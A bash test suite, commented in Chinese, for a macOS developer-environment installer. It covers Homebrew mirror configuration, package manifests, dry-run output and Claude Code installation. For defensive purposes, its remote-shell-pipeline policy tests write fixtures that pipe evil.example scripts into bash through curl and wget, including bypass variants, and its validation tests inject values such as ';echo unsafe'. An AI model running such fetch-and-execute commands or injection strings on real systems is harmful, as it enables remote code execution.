#!/bin/bash

set -u
set -o pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
MAC_DEV_BOOTSTRAP_TEST=1
export MAC_DEV_BOOTSTRAP_TEST
# shellcheck source=../install.sh
source "$ROOT_DIR/install.sh"

PASS_COUNT=0
FAIL_COUNT=0

pass() {
  PASS_COUNT=$((PASS_COUNT + 1))
  printf '通过：%s\n' "$1"
}

fail() {
  FAIL_COUNT=$((FAIL_COUNT + 1))
  printf '失败：%s\n' "$1" >&2
}

assert_true() {
  local name="$1"
  shift
  if "$@"; then
    pass "$name"
  else
    fail "$name"
  fi
}

assert_contains() {
  local name="$1"
  local haystack="$2"
  local needle="$3"
  if printf '%s\n' "$haystack" | grep -Fqx "$needle"; then
    pass "$name"
  else
    fail "${name}（缺少 ${needle}）"
  fi
}

assert_not_contains() {
  local name="$1"
  local haystack="$2"
  local needle="$3"
  if printf '%s\n' "$haystack" | grep -Fqx "$needle"; then
    fail "${name}（不应包含 ${needle}）"
  else
    pass "$name"
  fi
}

test_platform_contract() {
  assert_true "支持 Apple Silicon macOS" platform_supported Darwin arm64
  if platform_supported Darwin x86_64; then
    fail "拒绝非 Apple Silicon 环境"
  else
    pass "拒绝非 Apple Silicon 环境"
  fi
}

test_input_validation() {
  assert_true "接受标准 Python 版本" valid_python_version "3.12.2"
  if valid_python_version '3.12.2;echo unsafe'; then
    fail "拒绝异常 Python 版本"
  else
    pass "拒绝异常 Python 版本"
  fi
}

test_homebrew_mirror_contract() {
  assert_true "接受国内 Homebrew 镜像模式" valid_homebrew_mirror "china"
  assert_true "接受 Homebrew 官方源模式" valid_homebrew_mirror "official"
  if valid_homebrew_mirror 'china;echo unsafe'; then
    fail "拒绝异常 Homebrew 镜像模式"
  else
    pass "拒绝异常 Homebrew 镜像模式"
  fi

  local mirror_environment
  if mirror_environment="$({
    unset HOMEBREW_BREW_GIT_REMOTE HOMEBREW_CORE_GIT_REMOTE
    unset HOMEBREW_API_DOMAIN HOMEBREW_BOTTLE_DOMAIN
    export HOMEBREW_NO_INSTALL_FROM_API=1
    configure_homebrew_mirror china
    printf '%s\n' \
      "${HOMEBREW_BREW_GIT_REMOTE-}" \
      "${HOMEBREW_CORE_GIT_REMOTE-}" \
      "${HOMEBREW_API_DOMAIN-}" \
      "${HOMEBREW_BOTTLE_DOMAIN-}" \
      "HOMEBREW_NO_INSTALL_FROM_API=${HOMEBREW_NO_INSTALL_FROM_API-}"
  })"; then
    assert_contains "Brew 仓库使用清华镜像" "$mirror_environment" "https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git"
    assert_contains "Core 仓库使用清华镜像" "$mirror_environment" "https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git"
    assert_contains "Homebrew API 使用中科大镜像" "$mirror_environment" "https://mirrors.ustc.edu.cn/homebrew-bottles/api"
    assert_contains "Homebrew Bottle 使用中科大镜像" "$mirror_environment" "https://mirrors.ustc.edu.cn/homebrew-bottles"
    if printf '%s\n' "$mirror_environment" | grep -Fqx 'HOMEBREW_NO_INSTALL_FROM_API='; then
      pass "国内镜像模式启用 Homebrew API 安装"
    else
      fail "国内镜像模式启用 Homebrew API 安装"
    fi
  else
    fail "国内 Homebrew 镜像环境配置可执行"
  fi

  unset HOMEBREW_BREW_GIT_REMOTE HOMEBREW_CORE_GIT_REMOTE
  unset HOMEBREW_API_DOMAIN HOMEBREW_BOTTLE_DOMAIN
  configure_homebrew_mirror china >/dev/null 2>&1 || true
  if configure_homebrew_mirror official && \
    [[ "${HOMEBREW_BREW_GIT_REMOTE-}" == "https://github.com/Homebrew/brew" && \
       "${HOMEBREW_CORE_GIT_REMOTE-}" == "https://github.com/Homebrew/homebrew-core" && \
       -z "${HOMEBREW_API_DOMAIN-}" && \
       -z "${HOMEBREW_BOTTLE_DOMAIN-}" ]]; then
    pass "官方源模式显式恢复 Homebrew 官方仓库"
  else
    fail "官方源模式显式恢复 Homebrew 官方仓库"
  fi
}

test_homebrew_mirror_installer() {
  local output
  if output="$({
    homebrew_available() { return 1; }
    download_and_run() {
      printf '%s\n' "$2" "${HOMEBREW_BREW_GIT_REMOTE-}" "${HOMEBREW_API_DOMAIN-}"
    }
    load_homebrew() { return 0; }
    configure_homebrew_mirror china
    install_homebrew
  } 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq \
      'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh' && \
    printf '%s\n' "$output" | grep -Fq \
      'https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git' && \
    printf '%s\n' "$output" | grep -Fq \
      'https://mirrors.ustc.edu.cn/homebrew-bottles/api'; then
    pass "Homebrew 官方引导器继承国内镜像配置"
  else
    fail "Homebrew 官方引导器继承国内镜像配置"
  fi
}

test_homebrew_initialization_failure() {
  if (
    homebrew_available() { return 0; }
    load_homebrew() { return 42; }
    install_homebrew >/dev/null 2>&1
  ); then
    fail "已有 Homebrew 初始化失败时停止安装"
  else
    pass "已有 Homebrew 初始化失败时停止安装"
  fi

  if (
    find_homebrew_binary() { printf '/usr/bin/false\n'; }
    load_homebrew >/dev/null 2>&1
  ); then
    fail "brew shellenv 失败码不会被 eval 吞掉"
  else
    pass "brew shellenv 失败码不会被 eval 吞掉"
  fi
}

test_homebrew_mirror_shell_config() {
  local temporary_directory
  local managed_config
  local mirror_block
  local shell_output
  local expected_line
  temporary_directory="$(mktemp -d "${TMPDIR:-/tmp}/mac-dev-bootstrap-test.XXXXXX")"
  managed_config="$temporary_directory/zshrc.zsh"

  if ! write_managed_shell_config "$managed_config"; then
    fail "终端配置持久化 Homebrew 国内镜像"
    command rm -r "$temporary_directory"
    return
  fi

  for expected_line in \
    'HOMEBREW_BREW_GIT_REMOTE="https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git"' \
    'HOMEBREW_CORE_GIT_REMOTE="https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git"' \
    'HOMEBREW_API_DOMAIN="https://mirrors.ustc.edu.cn/homebrew-bottles/api"' \
    'HOMEBREW_BOTTLE_DOMAIN="https://mirrors.ustc.edu.cn/homebrew-bottles"' \
    'unset HOMEBREW_NO_INSTALL_FROM_API'; do
    if grep -Fq "$expected_line" "$managed_config"; then
      pass "终端配置持久化 Homebrew 国内镜像"
    else
      fail "终端配置持久化 Homebrew 国内镜像（缺少 ${expected_line}）"
    fi
  done

  mirror_block="$(sed -n '2,/^esac$/p' "$managed_config")"
  shell_output="$(MAC_DEV_HOMEBREW_MIRROR_BLOCK="$mirror_block" PATH="/usr/bin:/bin" /bin/bash -c '
    print_mirrors() {
      printf "%s:%s|%s|%s|%s\n" "$1" \
        "${HOMEBREW_BREW_GIT_REMOTE-}" \
        "${HOMEBREW_CORE_GIT_REMOTE-}" \
        "${HOMEBREW_API_DOMAIN-}" \
        "${HOMEBREW_BOTTLE_DOMAIN-}"
    }
    eval "$MAC_DEV_HOMEBREW_MIRROR_BLOCK"
    print_mirrors china
    export MAC_DEV_HOMEBREW_MIRROR=official
    eval "$MAC_DEV_HOMEBREW_MIRROR_BLOCK"
    print_mirrors official
    unset MAC_DEV_HOMEBREW_MIRROR
    eval "$MAC_DEV_HOMEBREW_MIRROR_BLOCK"
    print_mirrors china-again
    export MAC_DEV_HOMEBREW_MIRROR=invalid
    eval "$MAC_DEV_HOMEBREW_MIRROR_BLOCK"
    print_mirrors invalid
  ')"

  assert_contains "终端配置可切到 Homebrew 官方源" "$shell_output" \
    "official:https://github.com/Homebrew/brew|https://github.com/Homebrew/homebrew-core||"
  assert_contains "终端配置可恢复 Homebrew 国内镜像" "$shell_output" \
    "china-again:https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git|https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git|https://mirrors.ustc.edu.cn/homebrew-bottles/api|https://mirrors.ustc.edu.cn/homebrew-bottles"
  assert_contains "非法终端镜像模式不会沿用旧镜像" "$shell_output" "invalid:|||"

  command rm -r "$temporary_directory"
}

test_claude_installer_contract() {
  local output
  if output="$(DRY_RUN=1 run_claude_native_installer 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq \
      'curl -fsSL https://claude.ai/install.sh | bash'; then
    pass "Claude Code 使用官方原生安装命令"
  else
    fail "Claude Code 使用官方原生安装命令"
  fi
}

test_claude_installer_fallback() {
  local output
  if output="$({
    fallback_installed=0
    claude_code_available() { [[ "$fallback_installed" -eq 1 ]]; }
    run_claude_native_installer() { return 1; }
    run_command() {
      printf '兜底命令：%s\n' "$*"
      fallback_installed=1
    }
    install_claude_code
  } 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq \
      '兜底命令：brew install --cask claude-code'; then
    pass "Claude 原生安装失败后使用 Homebrew Cask"
  else
    fail "Claude 原生安装失败后使用 Homebrew Cask"
  fi
}

test_claude_installer_verification() {
  local output
  if output="$({
    native_attempted=0
    claude_code_available() { [[ "$native_attempted" -eq 1 ]]; }
    run_claude_native_installer() {
      native_attempted=1
      return 0
    }
    run_command() {
      printf '不应执行兜底：%s\n' "$*"
      return 1
    }
    install_claude_code
  } 2>&1)" && \
    ! printf '%s\n' "$output" | grep -Fq '不应执行兜底'; then
    pass "Claude 原生安装成功并验证后不执行兜底"
  else
    fail "Claude 原生安装成功并验证后不执行兜底"
  fi

  if (
    FAILED_STEPS=()
    claude_code_available() { return 1; }
    run_claude_native_installer() { return 0; }
    run_command() { return 1; }
    install_claude_code >/dev/null 2>&1
  ); then
    fail "Claude 安装器成功但命令不可用时仍判定失败"
  else
    pass "Claude 安装器成功但命令不可用时仍判定失败"
  fi
}

test_remote_shell_pipeline_policy() {
  local checker="$ROOT_DIR/tests/check_remote_shell_pipelines.sh"
  local temporary_directory
  local fixture

  temporary_directory="$(mktemp -d "${TMPDIR:-/tmp}/mac-dev-bootstrap-pipeline-test.XXXXXX")"
  fixture="$temporary_directory/install.sh"

  printf '%s\n' \
    '#!/bin/bash' \
    "printf '[模拟执行] curl -fsSL https://claude.ai/install.sh | bash\\n'" \
    'curl -fsSL https://claude.ai/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    pass "远程 Shell 管道策略允许唯一官方命令"
  else
    fail "远程 Shell 管道策略允许唯一官方命令"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'printf x; curl -fsSL https://evil.example/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝 printf 前缀绕过"
  else
    pass "远程 Shell 管道策略拒绝 printf 前缀绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'wget -qO- https://evil.example/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝 wget 绕过"
  else
    pass "远程 Shell 管道策略拒绝 wget 绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'curl -fsSL https://evil.example/install.sh | \' \
    '  bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝跨行绕过"
  else
    pass "远程 Shell 管道策略拒绝跨行绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'curl -fsSL https://evil.example/install.sh |' \
    '  bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝无反斜杠跨行绕过"
  else
    pass "远程 Shell 管道策略拒绝无反斜杠跨行绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'downloader=curl' \
    '"$downloader" -fsSL https://evil.example/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝变量间接调用"
  else
    pass "远程 Shell 管道策略拒绝变量间接调用"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'shell=bash' \
    'curl -fsSL https://evil.example/install.sh | "$shell"' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝变量 Shell 绕过"
  else
    pass "远程 Shell 管道策略拒绝变量 Shell 绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝重复官方命令"
  else
    pass "远程 Shell 管道策略拒绝重复官方命令"
  fi

  command rm -r "$temporary_directory"
}

test_formula_manifest() {
  local list
  list="$(formulae)"
  local item
  for item in git git-lfs gh node pyenv python@3.12 uv curl wget jq ripgrep fzf fd tree coreutils gemini-cli ansible; do
    assert_contains "Formula 清单" "$list" "$item"
  done
  assert_not_contains "Formula 清单排除 CMake" "$list" "cmake"
  assert_not_contains "Formula 清单排除 Ninja" "$list" "ninja"
}

test_doctor_manifest() {
  local list
  list="$(doctor_commands)"
  assert_contains "doctor 检查 Ansible" "$list" "ansible"
  assert_contains "doctor 检查 Ansible Playbook" "$list" "ansible-playbook"
}

test_cask_manifest() {
  local list
  list="$(casks)"
  local item
  for item in google-chrome feishu chatgpt ghostty visual-studio-code cc-switch font-hack-nerd-font font-jetbrains-mono-nerd-font font-maple-mono-nf-cn; do
    assert_contains "Cask 清单" "$list" "$item"
  done
}

test_npm_manifest() {
  local list
  list="$(npm_global_packages)"
  local item
  for item in corepack @openai/codex @larksuite/cli @lingjingai/awb-cli @lingjingai/lj-awb-cli chrome-devtools-mcp @modelcontextprotocol/server-postgres; do
    assert_contains "npm 全局清单" "$list" "$item"
  done
}

test_vscode_manifest() {
  local list
  list="$(vscode_extensions)"
  local item
  for item in anthropic.claude-code openai.chatgpt continue.continue ms-python.python ms-python.vscode-pylance ms-vscode-remote.remote-ssh vue.volar ritwickdey.liveserver davidanson.vscode-markdownlint ms-ceintl.vscode-language-pack-zh-hans; do
    assert_contains "VS Code 扩展清单" "$list" "$item"
  done
  assert_not_contains "VS Code 清单不含 Docker 扩展" "$list" "docker.docker"
}

test_dry_run_contract() {
  local output
  if output="$(MAC_DEV_BOOTSTRAP_TEST=0 /bin/bash "$ROOT_DIR/install.sh" --dry-run 2>&1)"; then
    if printf '%s\n' "$output" | grep -Fq '[模拟执行]'; then
      pass "dry-run 可执行且不落盘"
    else
      fail "dry-run 输出缺少模拟标记"
    fi
    if printf '%s\n' "$output" | grep -Fq 'Xcode Command Line Tools'; then
      fail "安装计划不应包含 Xcode Command Line Tools"
    else
      pass "安装计划不包含 Xcode Command Line Tools"
    fi
    if printf '%s\n' "$output" | grep -Fq 'Homebrew 镜像：国内'; then
      pass "安装计划显示默认 Homebrew 国内镜像"
    else
      fail "安装计划显示默认 Homebrew 国内镜像"
    fi
  else
    fail "dry-run 应成功退出"
  fi

  if MAC_DEV_BOOTSTRAP_TEST=0 MAC_DEV_HOMEBREW_MIRROR=invalid \
    /bin/bash "$ROOT_DIR/install.sh" --dry-run >/dev/null 2>&1; then
    fail "dry-run 拒绝非法 Homebrew 镜像模式"
  else
    pass "dry-run 拒绝非法 Homebrew 镜像模式"
  fi
}

test_xcode_clt_not_managed() {
  if grep -Fq 'xcode-select --install' "$ROOT_DIR/install.sh"; then
    fail "脚本不应主动安装 Xcode Command Line Tools"
  else
    pass "脚本不主动安装 Xcode Command Line Tools"
  fi
}

test_platform_contract
test_input_validation
test_homebrew_mirror_contract
test_homebrew_mirror_installer
test_homebrew_initialization_failure
test_homebrew_mirror_shell_config
test_claude_installer_contract
test_claude_installer_fallback
test_claude_installer_verification
test_remote_shell_pipeline_policy
test_formula_manifest
test_cask_manifest
test_npm_manifest
test_vscode_manifest
test_doctor_manifest
test_dry_run_contract
test_xcode_clt_not_managed

printf '\n测试汇总：%d 通过，%d 失败\n' "$PASS_COUNT" "$FAIL_COUNT"
if [[ "$FAIL_COUNT" -ne 0 ]]; then
  exit 1
fi
